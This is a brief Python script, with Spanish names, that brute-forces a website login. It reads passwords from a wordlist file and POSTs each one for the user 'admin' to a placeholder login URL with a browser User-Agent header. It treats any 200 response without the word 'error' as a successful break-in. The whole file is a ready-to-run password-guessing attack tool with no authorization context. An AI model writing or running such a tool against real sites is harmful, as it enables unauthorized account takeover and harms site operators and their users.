import requests

def leer_contraseñas():
    try:
        with open("contraseñas.txt", "r") as archivo:
            return [linea.strip() for linea in archivo if linea.strip()]
    except:
        print("Error: No se pudo leer contraseñas.txt")
        return []

def probar_login(url, usuario, contraseña):
    try:
        datos = {'username': usuario, 'password': contraseña}
        headers = {'User-Agent': 'Mozilla/5.0'}
        
        respuesta = requests.post(url, data=datos, headers=headers, timeout=5)
        
        
        if respuesta.status_code == 200:
            if 'error' not in respuesta.text.lower():
                return True
        return False
        
    except:
        return False

def main():
    url = "https://ejemplo.com/login"
    usuario = "admin"
    
    contraseñas = leer_contraseñas()
    
    if not contraseñas:
        print("Creando archivo de ejemplo...")
        with open("contraseñas.txt", "w") as f:
            f.write("password\n123456\nholamundo\n")
        contraseñas = leer_contraseñas()
    
    print(f"Probando {len(contraseñas)} contraseñas...")
    
    for contra in contraseñas:
        print(f"Probando: {contra}")
        if probar_login(url, usuario, contra):
            print(f"¡Éxito! Contraseña: {contra}")
            break
        else:
            print("Fallo")
    
    print("Prueba completada")

if __name__ == "__main__":
    main()
